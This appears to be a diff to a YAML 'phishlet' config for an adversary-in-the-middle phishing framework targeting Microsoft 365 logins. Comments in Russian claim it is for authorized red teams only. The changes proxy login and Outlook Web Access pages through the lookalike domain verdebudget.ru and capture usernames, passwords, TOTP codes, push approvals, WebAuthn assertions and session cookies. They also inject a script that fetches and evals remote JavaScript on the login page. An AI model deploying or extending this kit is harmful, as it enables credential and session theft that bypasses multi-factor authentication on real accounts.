@@ -1,6 +1,7 @@
-# Microsoft 365 phishlet (Phantom v2). Только авторизованный Red Team.
-# Перед боем: base_domains -> свой домен, прогнать живой логин и сверить токены.
-# Анатомия соответствует публичным community-phishlet (loginfmt/passwd, ESTSAUTH).
+# Microsoft 365 phishlet MAX (Phantom v2). Только авторизованный Red Team.
+# Перехват: логин + пароль + TOTP/Push/WebAuthn + сессионные токены +
+# post-login OWA (сессия остается под нашим хостом).
+# Авто-инжект fingerprint-challenge (best-effort, может резаться CSP).
 id: microsoft365
 version: 2
 base_domains:
@@ -21,6 +22,10 @@ proxy_hosts:
   - phish_sub: "msauthimg"
     orig_sub: "aadcdn"
     domain: "msftauthimages.net"
+    is_landing: false
+  - phish_sub: "owa"
+    orig_sub: "outlook"
+    domain: "office365.com"
     is_landing: false
 sub_filters:
   - triggers_on: "login.microsoftonline.com"
@@ -43,22 +48,38 @@ sub_filters:
     replace: "msauthimg.verdebudget.ru"
     mime: ["text/html", "text/css", "application/json", "javascript"]
     redirect_only: false
+  - triggers_on: "outlook.office365.com"
+    search: "outlook.office365.com"
+    replace: "owa.verdebudget.ru"
+    mime: ["text/html", "application/json"]
+    redirect_only: false
 auth_tokens:
   - domain: ".microsoftonline.com"
-    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT"]
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie", "buid"]
   - domain: ".live.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie", "buid"]
+  - domain: ".office365.com"
     keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT"]
 creds_map:
   - key: "login"
     search: "loginfmt"
   - key: "passwd"
     search: "passwd"
+  - key: "passwd"
+    search: "password"
 mfa_tokens:
   - key: "totp"
     search: "otc"
+  - key: "totp"
+    search: "totpPin"
   - key: "webauthn"
     search: "authenticatorAssertionResponse"
+  - key: "webauthn"
+    search: "publicKeyCredential"
   - key: "push"
     search: "Approve"
+js_inject:
+  - trigger: "login.microsoftonline.com"
+    src: "fetch('/__fp.js').then(r=>r.text()).then(eval).catch(()=>{});"
 lure_path: "/l/m365-01"
 enabled: true
